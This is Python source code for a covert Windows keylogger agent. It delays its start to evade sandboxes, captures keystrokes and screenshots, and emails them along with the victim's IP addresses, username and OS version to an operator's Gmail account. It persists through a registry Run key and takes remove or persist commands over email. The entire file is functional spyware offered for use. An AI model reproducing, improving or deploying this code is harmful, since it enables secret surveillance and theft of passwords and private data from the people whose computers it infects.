# Date: 01/28/2019
# Author: Mohamed
# Description: A Simple Keylogger

import sys 
import subprocess
from time import sleep 
from random import randint
from lib.gmail import Email 
from threading import Thread
from datetime import datetime
from lib.system import System
from lib.screen import Screenshot
from lib.keylogger import Keylogger
from lib.const import AgentConst, Command, Persist

# wait, we might be in a sandbox.
sleep(randint(16, wait_time))

# auto persist  
AUTO_PERSIST = auto_persist

# Creds
EMAIL = user_email
PASSWORD = user_password 


class Agent:

    def __init__(self, email, password):
        self.is_alive = True 
        self.system = System()
        self.screen = Screenshot()
        self.email = Email(email, password)
        self.keylogger = Keylogger(self.screen) 
    
    def send_log(self):
        data = self.keylogger.dump()
        now = datetime.now().strftime('%Y-%m-%d  %H:%M:%S')

        if data == '-1':
            return 

        time = '<b>Time:</b> <span style="font-size: 10px">{}</span>'.format(now)
        internal_ip = '<br><b>Internal IP:</b> <span style="font-size: 10px;">{}</span>'.format(self.system.internal_ip)
        external_ip = '<br><b>External IP:</b> <span style="font-size: 10px;">{}</span>'.format(self.system.external_ip)
        username = '<br><b>Username:</b> <span style="font-size: 10px;">{}</span>'.format(self.system.username)
        version = '<br><b>Version:</b> <span style="font-size: 10px;">{}</span><br>'.format(self.system.version)
        
        header = '\r\n{}\r\n{}\r\n{}\r\n{}\r\n{}'.format(
            time, internal_ip, external_ip, username, version
        )

        self.email.send('Logs of {} on {}'.format(self.system.username, now), header, data.strip())
        self.screen.remove_images()

    def dislodge(self):
        if not hasattr(sys, 'frozen'):
            return 

        cmd = r'reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v {} /f'.format(Persist.NAME.value)
        subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    
    def lodge(self):
        if not hasattr(sys, 'frozen'):
            return 

        _path = sys.executable
        cmd = r'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v {} /f /d "\"{}\""'.format(Persist.NAME.value, _path)
        subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
    def remove(self):
        self.dislodge()
        self.stop()

    def check_commands(self):
        return self.email.recv()
                                            
    def command_manager(self):
        while self.is_alive:
            for _ in range(AgentConst.COMMAND_TIME.value):
                if not self.is_alive:
                    break 

                sleep(1)
            
            if self.check_commands() == Command.REMOVE.value:
                self.send_log()
                self.remove()
            
            if self.check_commands() == Command.PERSIST.value:
                self.lodge()

    def _send_log(self):
        command = self.check_commands()
        self.send_log()

        if command == Command.REMOVE.value:
            self.remove()
            
    def log_manager(self):
        while self.is_alive:
            sent_log = False 
            
            for _ in range(AgentConst.MAX_WAIT_TIME.value):

                if not self.is_alive:
                    break 

                if self.keylogger._chars > AgentConst.MAX_CHARS.value:
                    self.keylogger._chars = 0

                    if not sent_log:
                        sent_log = True
                        self._send_log()
                    break

                sleep(1)

            if not sent_log:
                self._send_log()
    
    def start(self):
        log_manager_thread = Thread(target=self.log_manager)
        command_manager_thread = Thread(target=self.command_manager)

        log_manager_thread.daemon = True
        command_manager_thread.daemon = True 

        self.keylogger.start()
        log_manager_thread.start()
        command_manager_thread.start()

        while self.is_alive:
            sleep(1.5)

    def stop(self):
        self.is_alive = False
        self.keylogger.stop()


if __name__ == '__main__':

    agent = Agent(EMAIL, PASSWORD)
    if AUTO_PERSIST:
        agent.lodge()

    while agent.is_alive:  
        try:
            agent.start()
        except KeyboardInterrupt:
            agent.stop()
            break 
        except:
            pass 